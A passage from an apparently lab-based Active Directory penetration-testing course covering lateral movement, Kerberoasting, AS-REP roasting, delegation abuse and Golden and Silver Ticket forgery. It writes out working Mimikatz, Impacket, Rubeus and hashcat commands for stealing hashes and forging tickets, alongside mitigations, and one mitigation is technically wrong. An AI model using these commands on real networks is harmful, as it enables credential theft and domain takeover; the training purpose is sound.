Instrumentation (WMI) to execute commands.  It&#39;s often more stealthy than <code>psexec.py</code> but can be more complex to configure.</li>\n</ul>\n<p><strong>Example using <code>psexec.py</code> (again, building on a compromised account):</strong></p>\n<pre><code class=\"language-bash\">python3 psexec.py domain/username:password@target_ip -c &quot;whoami /all&quot;\n</code></pre>\n<p>or with hashes:</p>\n<pre><code class=\"language-bash\">python3 psexec.py domain/username@target_ip -hashes lmhash:nthash -c &quot;whoami /all&quot;\n</code></pre>\n</li>\n<li><p><strong>Key Impacket Modules:</strong></p>\n<ul>\n<li><code>smb</code>: Handles SMB/CIFS protocol interactions.</li>\n<li><code>dcerpc</code>: Handles DCE/RPC protocol interactions.</li>\n<li><code>ntlm</code>: Provides NTLM authentication support.</li>\n<li><code>krb5</code>: Provides Kerberos authentication support.</li>\n</ul>\n</li>\n</ul>\n<h2>4.6 Psexec</h2>\n<ul>\n<li><p><strong>Using PsExec for remote code execution (understanding its limitations and alternatives):</strong></p>\n<p>PsExec is a Sysinternals tool that allows you to execute processes on remote systems. It&#39;s similar to Impacket&#39;s <code>psexec.py</code> but is a standalone executable.</p>\n<ul>\n<li><strong>Limitations:</strong>  PsExec is easily detected by security tools.  It creates a service on the target system, which leaves traces.</li>\n<li><strong>Alternatives:</strong>  Impacket&#39;s <code>wmiexec.py</code> and WinRM are often better alternatives for stealthier remote code execution.</li>\n</ul>\n<p><strong>Example Usage:</strong></p>\n<pre><code>psexec.exe \\\\target_ip -u domain\\username -p password cmd.exe\n</code></pre>\n</li>\n</ul>\n<h2>4.7 Windows Remote Management (WinRM)</h2>\n<ul>\n<li><p><strong>Leveraging WinRM for lateral movement:</strong></p>\n<p>WinRM is a Windows service that allows you to manage remote systems using WS-Management protocol.  It&#39;s a powerful tool for lateral movement because it&#39;s often enabled by default in Active Directory environments.</p>\n<ul>\n<li><strong>Advantages:</strong>  More stealthy than PsExec.  Uses standard HTTP/HTTPS protocols.</li>\n<li><strong>Disadvantages:</strong> Requires WinRM to be enabled on the target system.  Can be more complex to configure.</li>\n</ul>\n<p><strong>PowerShell Example:</strong></p>\n<pre><code class=\"language-powershell\"># Enable WinRM (if not already enabled)\nEnable-PSRemoting -Force\n\n# Create a remote session\n$session = New-PSSession -ComputerName target_ip -Credential domain\\username\n\n# Execute a command remotely\nInvoke-Command -Session $session -ScriptBlock { Get-Process }\n\n# Close the session\nRemove-PSSession $session\n</code></pre>\n<p><strong>Python Example (using <code>winrm</code> library):</strong></p>\n<pre><code class=\"language-python\">import winrm\n\ns = winrm.Session(&#39;target_ip&#39;, auth=(&#39;username&#39;, &#39;password&#39;))\nr = s.run_ps(&#39;Get-Process&#39;)\n\nprint(r.status_code)\nprint(r.std_out)\nprint(r.std_err)\n</code></pre>\n<ul>\n<li>You might need to configure WinRM trusted hosts: <code>Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value &quot;*&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h2>4.8 Case Study: Analyzing Real-World Lateral Movement Scenarios</h2>\n<ul>\n<li><p><strong>Scenario 1: The Printer Bug</strong></p>\n<p>An attacker gains initial access to a workstation used by an employee with access to a network printer. Using PrintNightmare (CVE-2021-34527), the attacker is able to force the printer to authenticate with NTLM to the attacker&#39;s machine, gaining the employee&#39;s NTLM hash. The attacker then uses PtH to access other systems on the network using the stolen credentials.</p>\n</li>\n<li><p><strong>Scenario 2: The SQL Server Leak</strong></p>\n<p>An attacker compromises a web server connected to a SQL Server. The attacker discovers that the SQL Server service account has domain admin privileges (a common misconfiguration). The attacker dumps the credentials of the SQL Server service account using <code>Mimikatz</code> and uses them to compromise the entire domain.</p>\n</li>\n<li><p><strong>Scenario 3: The GPO Mishap</strong></p>\n<p>An attacker exploits a vulnerability to modify a Group Policy Object (GPO). The attacker modifies the GPO to execute a malicious script on all systems in the domain. This script installs a backdoor and grants the attacker persistent access.</p>\n<p><strong>Detection Methods:</strong></p>\n<ul>\n<li><strong>SIEM (Security Information and Event Management):</strong>  Analyze logs for suspicious authentication activity, such as multiple failed login attempts, logins from unusual locations, or the use of PtH/PtT techniques.</li>\n<li><strong>Endpoint Detection and Response (EDR):</strong>  Monitor for suspicious processes, file modifications, and network connections.</li>\n<li><strong>Honeypots:</strong>  Deploy honeypot accounts and systems to detect unauthorized access attempts.</li>\n<li><strong>Active Directory Auditing:</strong>  Enable auditing of Active Directory objects to track changes to user accounts, group memberships, and GPOs.</li>\n</ul>\n</li>\n</ul>\n<h2>Module 4 Project: Lateral Movement in the Lab</h2>\n<ol>\n<li><p><strong>Compromise a User Account:</strong> Start with a user account that is <em>not</em> a domain administrator. This could be a standard user account that you compromised using password spraying (from Module 3).</p>\n</li>\n<li><p><strong>Pass-the-Hash:</strong></p>\n<ul>\n<li>Use <code>Mimikatz</code> on the compromised workstation to extract the NTLM hash of the user account.</li>\n<li>Identify another system on the network where the user account has access (e.g., a file share, another workstation).</li>\n<li>Use <code>psexec.py</code> or another PtH tool to execute a command on the target system using the stolen NTLM hash.</li>\n<li>Document your steps and the results.</li>\n</ul>\n</li>\n<li><p><strong>Pass-the-Ticket:</strong></p>\n<ul>\n<li>Use <code>Mimikatz</code> to extract Kerberos tickets from the compromised workstation.</li>\n<li>Identify a service on the network that you want to access using the stolen Kerberos ticket.</li>\n<li>Use <code>Mimikatz</code> to inject the Kerberos ticket into your current session.</li>\n<li>Attempt to access the service.</li>\n<li>Document your steps and the results.</li>\n</ul>\n</li>\n<li><p><strong>Impacket Exploration:</strong></p>\n<ul>\n<li>Experiment with <code>smbexec.py</code> and <code>wmiexec.py</code> to execute commands on remote systems.</li>\n<li>Compare the effectiveness of these tools with <code>psexec.py</code>.</li>\n<li>Document your findings.</li>\n</ul>\n</li>\n<li><p><strong>Extend Your Attack Tool:</strong></p>\n<ul>\n<li>Incorporate Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) functionality into your evolving attack tool (from Module 2 and 3 projects). This should include:<ul>\n<li>A function to extract NTLM hashes from a file (e.g., a SAM database dump).</li>\n<li>A function to execute commands on a remote system using PtH.</li>\n<li>A function to inject Kerberos tickets into the current session.</li>\n<li>Clear command-line options for each function.</li>\n</ul>\n</li>\n<li>Document the design and implementation of your tool.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Deliverables:</strong></p>\n<ul>\n<li>A detailed report documenting your lateral movement activities in the lab environment. Include screenshots, command-line outputs, and explanations of each step.</li>\n<li>The updated version of your attack tool, including the PtH and PtT functionality.</li>\n<li>A write-up explaining the design and implementation of your attack tool.</li>\n</ul>\n<p>This module is designed to be hands-on. Don&#39;t be afraid to experiment and try different techniques. The more you practice, the better you&#39;ll understand the principles of lateral movement and the more effective you&#39;ll be at identifying and exploiting vulnerabilities in Active Directory environments. Good luck!</p>\n\n                </div>\n             </div>\n         ",
    "module-5": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 5: module_5</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Okay, let&#39;s dive deep into Module 5: Domain Compromise. This is where things get <em>really</em> interesting. We&#39;re going to learn how to leverage the footholds we&#39;ve established to gain complete control of the Active Directory environment. This module builds heavily on the concepts introduced in previous modules, especially Module 4 (Lateral Movement), so make sure you&#39;re comfortable with those topics before proceeding.</p>\n<h1>Module 5: Domain Compromise - Taking Control</h1>\n<p><strong>Module Objective:</strong> Learn and apply techniques to achieve domain compromise, gaining full control of the Active Directory environment.</p>\n<h2>5.1 Understanding Domain Dominance</h2>\n<p>Domain dominance is the ultimate goal of an Active Directory penetration test. It means gaining the ability to control all aspects of the domain, including user accounts, computer accounts, group memberships, Group Policy Objects (GPOs), and trust relationships.  A successful domain compromise allows an attacker to:</p>\n<ul>\n<li><strong>Create and modify user accounts:</strong> Including creating new domain administrators or modifying existing ones.</li>\n<li><strong>Deploy malware to all systems within the domain:</strong>  Using GPOs or other deployment mechanisms.</li>\n<li><strong>Access sensitive data stored on any system within the domain:</strong> Including databases, file shares, and email servers.</li>\n<li><strong>Establish persistent access to the domain:</strong>  Ensuring continued control even after initial detection and remediation efforts.</li>\n<li><strong>Potentially pivot to other trusted domains:</strong> If trust relationships exist with other Active Directory forests.</li>\n</ul>\n<p>In short, domain dominance grants an attacker complete control over the organization&#39;s IT infrastructure.</p>\n<h2>5.2 Kerberoasting</h2>\n<p>Kerberoasting is a powerful technique for cracking service account passwords. It leverages the Kerberos authentication protocol to request and crack tickets for service accounts.</p>\n<h3>5.2.1 Understanding Service Principal Names (SPNs)</h3>\n<p>A Service Principal Name (SPN) is a unique identifier for a service running on a server. It&#39;s used by Kerberos to identify the service when a client requests a ticket. SPNs are registered in Active Directory and associated with a service account.</p>\n<ul>\n<li><strong>Format:</strong> <code>serviceclass/hostname:port/servicename</code></li>\n<li><strong>Example:</strong> <code>MSSQLSvc/sqlserver.example.com:1433</code></li>\n</ul>\n<p>Common service classes include:</p>\n<ul>\n<li><code>MSSQLSvc</code>: Microsoft SQL Server</li>\n<li><code>HTTP</code>: Web servers</li>\n<li><code>HOST</code>: Generic host service</li>\n<li><code>CIFS</code>: Common Internet File System (file shares)</li>\n</ul>\n<p>Identifying SPNs is crucial for Kerberoasting. You can use PowerShell to list SPNs:</p>\n<pre><code class=\"language-powershell\"># Requires the Active Directory module\nImport-Module ActiveDirectory\n\n# Get all SPNs in the domain\nGet-ADObject -Filter {ObjectClass -eq &quot;user&quot;} -Properties servicePrincipalName |\n  Where-Object {$_.servicePrincipalName -ne $null} |\n  Select-Object -Property Name, servicePrincipalName\n</code></pre>\n<p>This script retrieves all user objects with a <code>servicePrincipalName</code> attribute, effectively listing all registered SPNs.</p>\n<h3>5.2.2 Requesting and Cracking Kerberos Tickets for Service Accounts</h3>\n<p>The Kerberoasting process involves the following steps:</p>\n<ol>\n<li><strong>Enumerate SPNs:</strong> Identify the SPNs in the domain (as shown above).</li>\n<li><strong>Request Kerberos Tickets (TGS):</strong>  For each SPN, request a Ticket Granting Service (TGS) ticket.  These tickets are encrypted with the service account&#39;s password hash.</li>\n<li><strong>Extract the Ticket:</strong> Extract the encrypted TGS ticket from the Kerberos response.</li>\n<li><strong>Crack the Ticket:</strong> Use a password cracking tool like Hashcat or John the Ripper to crack the TGS ticket and recover the service account password.</li>\n</ol>\n<p>Here&#39;s how you can do this using PowerShell and <code>GetUserSPNs.py</code> from the Impacket library:</p>\n<ol>\n<li><p><strong>Install Impacket:</strong></p>\n<pre><code class=\"language-bash\">pip3 install impacket\n</code></pre>\n</li>\n<li><p><strong>Run <code>GetUserSPNs.py</code>:</strong></p>\n<pre><code class=\"language-bash\"># Replace with your domain and credentials\npython3 GetUserSPNs.py -dc-ip &lt;domain_controller_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -request\n</code></pre>\n<p>This will output the Kerberos tickets in a format suitable for Hashcat.  The <code>-request</code> flag tells the script to request the tickets.</p>\n</li>\n<li><p><strong>Crack the Tickets with Hashcat:</strong></p>\n<pre><code class=\"language-bash\">hashcat -m 13100 &lt;hash_file&gt; /usr/share/wordlists/rockyou.txt\n</code></pre>\n<ul>\n<li><code>-m 13100</code>:  Specifies the Hashcat mode for Kerberos 5 TGS tickets.</li>\n<li><code>&lt;hash_file&gt;</code>: The file containing the extracted Kerberos tickets from <code>GetUserSPNs.py</code>.</li>\n<li><code>/usr/share/wordlists/rockyou.txt</code>:  A common wordlist for password cracking.  You can use other wordlists or rulesets as needed.</li>\n</ul>\n</li>\n</ol>\n<p>Alternatively, you can use <code>Rubeus</code> (a C# tool) for requesting and cracking tickets:</p>\n<ol>\n<li><p><strong>Download Rubeus:</strong>  <a href=\"https://github.com/GhostPack/Rubeus\">https://github.com/GhostPack/Rubeus</a></p>\n</li>\n<li><p><strong>Run Rubeus (from a compromised Windows host):</strong></p>\n<pre><code class=\"language-powershell\"># Request tickets\n.\\Rubeus.exe kerberoast /domain:&lt;domain&gt; /outfile:tickets.kirbi\n\n# Crack tickets (requires Hashcat)\n.\\Rubeus.exe kerberoast /crack:tickets.kirbi /wordlist:/usr/share/wordlists/rockyou.txt\n</code></pre>\n</li>\n</ol>\n<h3>5.2.3 Mitigation Strategies</h3>\n<ul>\n<li><strong>Complex Service Account Passwords:</strong> Enforce strong, unique passwords for all service accounts.  Ideally, these passwords should be randomly generated and at least 20 characters long.</li>\n<li><strong>Managed Service Accounts (MSAs) and Group Managed Service Accounts (gMSAs):</strong>  Use MSAs or gMSAs instead of traditional user accounts for services. MSAs and gMSAs automatically manage the service account password, rotating it regularly and securely.  gMSAs are preferred as they can be used across multiple servers.</li>\n<li><strong>Account Monitoring:</strong>  Monitor for suspicious Kerberos ticket requests, especially for service accounts.  Look for unusually high volumes of requests or requests from unusual locations.</li>\n<li><strong>Regular Password Audits:</strong> Regularly audit service account passwords to ensure they meet complexity requirements.</li>\n<li><strong>Principle of Least Privilege:</strong>  Ensure service accounts only have the necessary permissions to perform their intended functions. Avoid granting service accounts unnecessary privileges, such as domain administrator rights.</li>\n</ul>\n<h2>5.3 AS-REP Roasting</h2>\n<p>AS-REP Roasting is another technique for cracking user account passwords. It exploits a misconfiguration where user accounts have the &quot;Do not require Kerberos preauthentication&quot; setting enabled.</p>\n<h3>5.3.1 Identifying Accounts with &quot;Do Not Require Kerberos Preauthentication&quot; Enabled</h3>\n<p>When &quot;Do not require Kerberos preauthentication&quot; is enabled, the domain controller will issue a Kerberos Ticket Granting Ticket (TGT) without requiring the client to prove its identity. This TGT is encrypted with the user&#39;s password hash, making it vulnerable to offline cracking.</p>\n<p>You can use PowerShell to identify these accounts:</p>\n<pre><code class=\"language-powershell\">Import-Module ActiveDirectory\n\nGet-ADObject -LDAPFilter &quot;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&quot; -Properties userAccountControl |\n    Select-Object Name, userAccountControl\n</code></pre>\n<p>The LDAP filter <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> identifies user accounts with the <code>DONT_REQ_PREAUTH</code> flag set in the <code>userAccountControl</code> attribute (value 4194304).</p>\n<p>Alternatively, using <code>GetNPUsers.py</code> from Impacket:</p>\n<pre><code class=\"language-bash\">python3 GetNPUsers.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;domain_controller_ip&gt;\n</code></pre>\n<p>This script will list all accounts with pre-authentication disabled.</p>\n<h3>5.3.2 Requesting and Cracking Kerberos Tickets Without Preauthentication</h3>\n<p>The AS-REP Roasting process involves the following steps:</p>\n<ol>\n<li><strong>Identify Accounts:</strong> Identify user accounts with &quot;Do not require Kerberos preauthentication&quot; enabled (as shown above).</li>\n<li><strong>Request Kerberos Tickets (TGT):</strong> For each identified account, request a TGT.</li>\n<li><strong>Extract the Ticket:</strong> Extract the encrypted TGT from the Kerberos response.</li>\n<li><strong>Crack the Ticket:</strong> Use a password cracking tool like Hashcat or John the Ripper to crack the TGT and recover the user account password.</li>\n</ol>\n<p>Using <code>GetNPUsers.py</code> from Impacket (continued from above):</p>\n<pre><code class=\"language-bash\">python3 GetNPUsers.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;domain_controller_ip&gt; -request\n</code></pre>\n<p>The <code>-request</code> flag tells the script to request the TGTs.  The output will be in a format suitable for Hashcat.</p>\n<p>Cracking the TGT with Hashcat:</p>\n<pre><code class=\"language-bash\">hashcat -m 18200 &lt;hash_file&gt; /usr/share/wordlists/rockyou.txt\n</code></pre>\n<ul>\n<li><code>-m 18200</code>: Specifies the Hashcat mode for Kerberos 5 AS-REP.</li>\n<li><code>&lt;hash_file&gt;</code>: The file containing the extracted Kerberos tickets from <code>GetNPUsers.py</code>.</li>\n</ul>\n<p>Rubeus can also be used for AS-REP roasting:</p>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt\nhashcat -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<h3>5.3.3 Mitigation Strategies</h3>\n<ul>\n<li><p><strong>Enforce Kerberos Preauthentication:</strong>  The most effective mitigation is to ensure that Kerberos preauthentication is required for all user accounts.  Disable the &quot;Do not require Kerberos preauthentication&quot; setting. This can be done through Group Policy:</p>\n<ul>\n<li>Navigate to: <code>Computer Configuration\\Policies\\Windows Settings\\Security Settings\\Account Policies\\Kerberos Policy</code></li>\n<li>Set &quot;Maximum lifetime for service ticket&quot; to a reasonable value (e.g., 10 hours). This forces clients to re-authenticate more frequently, reducing the window of opportunity for AS-REP roasting.</li>\n</ul>\n</li>\n<li><p><strong>Account Monitoring:</strong>  Monitor for suspicious Kerberos TGT requests, especially for accounts with preauthentication disabled.</p>\n</li>\n<li><p><strong>Strong Passwords:</strong>  Encourage users to use strong, unique passwords.  Implement password policies that enforce complexity requirements and prevent the use of common passwords.</p>\n</li>\n<li><p><strong>Regular Password Audits:</strong> Regularly audit user account passwords to ensure they meet complexity requirements.</p>\n</li>\n</ul>\n<h2>5.4 Delegation Attacks (Constrained and Unconstrained Delegation)</h2>\n<p>Kerberos delegation allows a service to act on behalf of a user when accessing other services. However, misconfigured delegation settings can be exploited to gain unauthorized access. There are two main types of Kerberos delegation:</p>\n<h3>5.4.1 Unconstrained Delegation</h3>\n<p>Unconstrained delegation is the older and less secure form of delegation. When unconstrained delegation is enabled for a service, the service can request a TGT on behalf of <em>any</em> user. This TGT can then be used to impersonate the user and access <em>any</em> service on the domain.</p>\n<p><strong>Vulnerability:</strong> If a server with unconstrained delegation is compromised, an attacker can steal the TGTs of users who authenticate to that server.  This allows the attacker to impersonate those users and gain access to any resource they have access to, including domain administrator accounts.</p>\n<p><strong>Detection:</strong>  Identify computers with unconstrained delegation enabled.  You can use PowerShell:</p>\n<pre><code class=\"language-powershell\">Import-Module ActiveDirectory\n\nGet-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation |\n    Select-Object Name, TrustedForDelegation\n</code></pre>\n<p><strong>Mitigation:</strong></p>\n<ul>\n<li><strong>Avoid Unconstrained Delegation:</strong>  Unconstrained delegation should be avoided whenever possible. It is inherently insecure and should only be used as a last resort.</li>\n<li><strong>Transition to Constrained Delegation:</strong>  Migrate services to constrained delegation or resource-based constrained delegation.</li>\n<li><strong>Monitor for Suspicious Activity:</strong>  Monitor servers with unconstrained delegation enabled for suspicious activity, such as unauthorized access attempts.</li>\n</ul>\n<h3>5.4.2 Constrained Delegation</h3>\n<p>Constrained delegation is a more secure form of delegation that limits the services a service can access on behalf of a user. With constrained delegation, you specify the services that the service is allowed to access.</p>\n<p><strong>Types of Constrained Delegation:</strong></p>\n<ul>\n<li><strong>Constrained Delegation (Traditional):</strong>  The service account is configured to trust specific services on other servers. The service can only request tickets for those specific services.</li>\n<li><strong>Resource-Based Constrained Delegation (RBCD):</strong>  The resource (the service being accessed) is configured to trust specific service accounts.  This allows you to control delegation from the resource side.  RBCD is generally preferred as it gives the resource owner more control over who can access it.</li>\n</ul>\n<p><strong>Vulnerability:</strong>  While more secure than unconstrained delegation, constrained delegation can still be vulnerable if misconfigured.  For example, if a service is granted delegation rights to a highly privileged service (e.g., a service running as SYSTEM), an attacker could potentially leverage that delegation to gain elevated privileges.</p>\n<p><strong>Exploitation:</strong></p>\n<ul>\n<li><strong>Abusing Constrained Delegation:</strong> If you control a computer that has constrained delegation configured to another service, you can potentially abuse that delegation to impersonate users and access the target service.</li>\n<li><strong>Shadow Credentials:</strong>  This involves adding a new credential to the target service account and then using that credential to authenticate to the target service.</li>\n</ul>\n<p><strong>Detection:</strong></p>\n<ul>\n<li><p><strong>Identify Constrained Delegation Settings:</strong> Use PowerShell to identify constrained delegation settings:</p>\n<pre><code class=\"language-powershell\">Import-Module ActiveDirectory\n\nGet-ADComputer -Filter {msDS-AllowedToDelegateTo -like &quot;*&quot;} -Properties msDS-AllowedToDelegateTo |\n    Select-Object Name, msDS-AllowedToDelegateTo\n</code></pre>\n<p>This script retrieves all computers with constrained delegation configured.</p>\n</li>\n<li><p><strong>BloodHound:</strong>  BloodHound is an excellent tool for visualizing and identifying delegation attack paths.</p>\n</li>\n</ul>\n<p><strong>Mitigation:</strong></p>\n<ul>\n<li><strong>Principle of Least Privilege:</strong>  Grant delegation rights only to the services that absolutely require them. Avoid granting delegation rights to highly privileged services.</li>\n<li><strong>Regular Audits:</strong>  Regularly audit delegation settings to ensure they are configured correctly and that no unnecessary delegation rights have been granted.</li>\n<li><strong>Monitor for Suspicious Activity:</strong>  Monitor for suspicious activity related to delegated accounts, such as unauthorized access attempts.</li>\n<li><strong>Implement Tiering:</strong> Implement a tiered administrative model to restrict access to privileged accounts and systems.</li>\n</ul>\n<p><strong>Tools for Delegation Attacks:</strong></p>\n<ul>\n<li><strong>Rubeus:</strong>  A versatile C# tool for Kerberos attacks, including delegation attacks.</li>\n<li><strong>PowerView:</strong>  A PowerShell tool for Active Directory enumeration and exploitation.</li>\n<li><strong>BloodHound:</strong>  For visualizing and identifying delegation attack paths.</li>\n</ul>\n<h2>5.5 Golden Ticket Attacks</h2>\n<p>A Golden Ticket attack allows an attacker to forge a Kerberos Ticket Granting Ticket (TGT) for the <code>krbtgt</code> account. The <code>krbtgt</code> account is used to encrypt all Kerberos TGTs.  By forging a TGT for this account, an attacker can create tickets that are valid for <em>any</em> user and <em>any</em> service in the domain, effectively granting them complete control of the domain.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>Compromised <code>krbtgt</code> account password hash. This typically requires domain administrator privileges.</li>\n</ul>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Obtain the <code>krbtgt</code> Hash:</strong>  Use <code>Mimikatz</code> to extract the <code>krbtgt</code> hash from a domain controller:</p>\n<pre><code class=\"language-powershell\"># Run Mimikatz as a domain administrator\nprivilege::debug\nlsadump::dcsync /domain:&lt;domain_name&gt; /user:krbtgt\n</code></pre>\n<p>This will output the NTLM hash of the <code>krbtgt</code> account.</p>\n</li>\n<li><p><strong>Forge the Golden Ticket:</strong>  Use <code>Mimikatz</code> to forge the Golden Ticket:</p>\n<pre><code class=\"language-powershell\">kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /krbtgt:&lt;krbtgt_hash&gt; /user:&lt;username&gt; /id:500\n</code></pre>\n<ul>\n<li><code>&lt;domain_name&gt;</code>: The name of the domain.</li>\n<li><code>&lt;domain_sid&gt;</code>: The SID of the domain.</li>\n<li><code>&lt;krbtgt_hash&gt;</code>: The NTLM hash of the <code>krbtgt</code> account.</li>\n<li><code>&lt;username&gt;</code>: The username for which to create the Golden Ticket (e.g., <code>administrator</code>).</li>\n<li><code>/id:500</code>:  Sets the RID (Relative ID) to 500, which is the RID for the built-in Administrator account.</li>\n</ul>\n</li>\n<li><p><strong>Import the Ticket:</strong>  Import the forged Golden Ticket into the current Kerberos session:</p>\n<pre><code class=\"language-powershell\">kerberos::ptt &lt;ticket_file&gt;\n</code></pre>\n<p>Where <code>&lt;ticket_file&gt;</code> is the file containing the forged ticket.</p>\n</li>\n<li><p><strong>Verify Domain Administrator Access:</strong>  You should now have domain administrator privileges.  You can verify this by attempting to access a domain controller using <code>psexec</code>:</p>\n<pre><code class=\"language-powershell\">psexec \\\\&lt;domain_controller_ip&gt; cmd.exe\n</code></pre>\n</li>\n</ol>\n<p><strong>Mitigation:</strong></p>\n<ul>\n<li><strong>Protect the <code>krbtgt</code> Account:</strong> The <code>krbtgt</code> account is the most important account in the domain.  It should be protected with extreme care.</li>\n<li><strong>Regularly Rotate the <code>krbtgt</code> Password:</strong>  Rotating the <code>krbtgt</code> password invalidates all existing Golden Tickets.  Microsoft recommends rotating the <code>krbtgt</code> password at least twice a year.  This is a complex and potentially disruptive process, so it should be planned carefully.  Use the <code>Reset-KrbTgtKey</code> cmdlet.  <strong>Caution: Ensure you fully understand the implications and follow Microsoft&#39;s documentation carefully before rotating the <code>krbtgt</code> password.</strong></li>\n<li><strong>Monitor for Golden Ticket Attacks:</strong>  Monitor for suspicious Kerberos activity, such as TGT requests for the <code>krbtgt</code> account or TGT requests with unusual characteristics.</li>\n<li><strong>Implement Tiering:</strong> Implement a tiered administrative model to restrict access to domain controllers.</li>\n<li><strong>Credential Guard:</strong>  Credential Guard helps protect NTLM and Kerberos secrets by isolating them in a virtualized environment.</li>\n</ul>\n<h2>5.6 Silver Ticket Attacks</h2>\n<p>A Silver Ticket attack allows an attacker to forge a Kerberos service ticket to access a specific service.  Unlike a Golden Ticket attack, a Silver Ticket attack only grants access to a single service.  However, if that service has elevated privileges, a Silver Ticket attack can still be very damaging.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>Compromised service account password hash.</li>\n<li>Knowledge of the SPN for the target service.</li>\n</ul>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Obtain the Service Account Hash:</strong>  Use <code>Mimikatz</code> to extract the service account hash from the target server:</p>\n<pre><code class=\"language-powershell\"># Run Mimikatz on the target server as an administrator\nprivilege::debug\nlsadump::lsa /name:&lt;service_account_name&gt; /patch\n</code></pre>\n<p>This will output the NTLM hash of the service account.</p>\n</li>\n<li><p><strong>Forge the Silver Ticket:</strong>  Use <code>Mimikatz</code> to forge the Silver Ticket:</p>\n<pre><code class=\"language-powershell\">kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /target:&lt;target_server&gt; /service:&lt;service_name&gt; /id:500 /krbtgt:&lt;service_account_hash&gt;\n</code></pre>\n<ul>\n<li><code>&lt;domain_name&gt;</code>: The name of the domain.</li>\n<li><code>&lt;domain_sid&gt;</code>: The SID of the domain.</li>\n<li><code>&lt;target_server&gt;</code>: The hostname of the target server.</li>\n<li><code>&lt;service_name&gt;</code>: The SPN of the target service (e.g., <code>cifs</code>).</li>\n<li><code>/id:500</code>:  Sets the RID (Relative ID) to 500, which is the RID for the built-in Administrator account (for local admin access on the target machine).</li>\n<li><code>&lt;service_account_hash&gt;</code>: The NTLM hash of the service account.</li>\n</ul>\n</li>\n<li><p><strong>Import the Ticket:</strong>  Import the forged Silver Ticket into the current Kerberos session:</p>\n<pre><code class=\"language-powershell\">kerberos::ptt &lt;ticket_file&gt;\n</code></pre>\n<p>Where <code>&lt;ticket_file&gt;</code> is the file containing the forged ticket.</p>\n</li>\n<li><p><strong>Access the Service:</strong>  You should now have access to the target service.  For example, if you forged a Silver Ticket for the CIFS service, you can access the target server&#39;s file shares:</p>\n<pre><code class=\"language-powershell\">dir \\\\&lt;target_server&gt;\\c$\n</code></pre>\n</li>\n</ol>\n<p><strong>Mitigation:</strong></p>\n<ul>\n<li><strong>Protect Service Account Passwords:</strong>  Enforce strong, unique passwords for all service accounts.</li>\n<li><strong>Managed Service Accounts (MSAs) and Group Managed Service Accounts (gMSAs):</strong>  Use MSAs or gMSAs instead of traditional user accounts for services.</li>\n<li><strong>Monitor for Silver Ticket Attacks:</strong>  Monitor for suspicious Kerberos activity, such as service ticket requests with unusual characteristics.</li>\n<li><strong>Implement Tiering:</strong> Implement a tiered administrative model to restrict access to privileged accounts and systems.</li>\n<li><strong>LSA Protection:</strong> Enable LSA Protection to prevent <code>lsass.exe</code> from being accessed by unauthorized processes.</li>\n</ul>\n<h2>5.7 Case Study: Analyzing Real-World Domain Compromise Scenarios and Their Impact</h2>\n<p>Let&#39;s consider a hypothetical, but realistic, scenario:</p>\n<p><strong>Scenario:</strong>  A company, &quot;Example Corp,&quot; suffers a data breach.  The attackers gained initial access through a phishing email that compromised a low-level user account.</p>\n<p><strong>Attack Path:</strong></p>\n<ol>\n<li><strong>Initial Access:</strong> Phishing email leads to a compromised user account on a workstation.</li>\n<li><strong>Enumeration:</strong>  The attacker uses <code>BloodHound</code> to map the Active Directory environment and identifies a server with unconstrained delegation enabled (ServerA).</li>\n<li><strong>Lateral Movement:</strong>  The attacker waits for a domain administrator to log onto ServerA.  The attacker then steals the domain administrator&#39;s TGT from ServerA&#39;s memory.</li>\n<li><strong>Domain Compromise:</strong>  Using the stolen TGT, the attacker impersonates the domain administrator and gains full control of the domain.</li>\n<li><strong>Data Exfiltration:</strong> The attacker accesses sensitive data stored on file shares and databases and exfiltrates it to an external server.</li>\n</ol>\n<p><strong>Impact:</strong></p>\n<ul>\n<li><strong>Data Breach:</strong> Sensitive data is stolen and potentially exposed.</li>\n<li><strong>Reputational Damage:</strong>  The company&#39;s reputation is damaged due to the data breach.</li>\n<li><strong>Financial Loss:</strong>  The company incurs costs related to incident response, legal fees, and regulatory fines.</li>\n<li><strong>Business Disruption:</strong>  The company&#39;s operations are disrupted due to the data breach.</li>\n</ul>\n<p><strong>Lessons Learned:</strong></p>\n<ul>\n<li><strong>Importance of User Awareness Training:</strong>  Users need to be trained to recognize and avoid phishing emails.</li>\n<li><strong>Risk of Unconstrained Delegation:</strong>  Unconstrained delegation should be avoided whenever possible.</li>\n<li><strong>Importance of Monitoring:</strong>  Organizations need to monitor their Active Directory environments for suspicious activity.</li>\n<li><strong>Need for Strong Security Controls:</strong>  Organizations need to implement strong security controls, such as multi-factor authentication and regular security audits.</li>\n</ul>\n<h2>Module 5 Project: Domain Compromise in the Lab</h2>\n<p>In your lab environment, perform the following tasks:</p>\n<ol>\n<li><strong>Kerberoasting:</strong> Identify SPNs, request Kerberos tickets, and crack the tickets to obtain service account credentials.</li>\n<li><strong>AS-REP Roasting:</strong> Identify accounts with &quot;Do not require Kerberos preauthentication&quot; enabled, request Kerberos tickets, and crack the tickets to obtain user account credentials.</li>\n<li><strong>Delegation Attacks:</strong> Identify servers with unconstrained and constrained delegation enabled. Attempt to exploit these delegation settings to gain elevated privileges.</li>\n<li><strong>Golden Ticket Attack:</strong> Obtain the <code>krbtgt</code> hash and forge a Golden Ticket to gain domain administrator privileges.</li>\n<li><strong>Silver Ticket Attack:</strong> 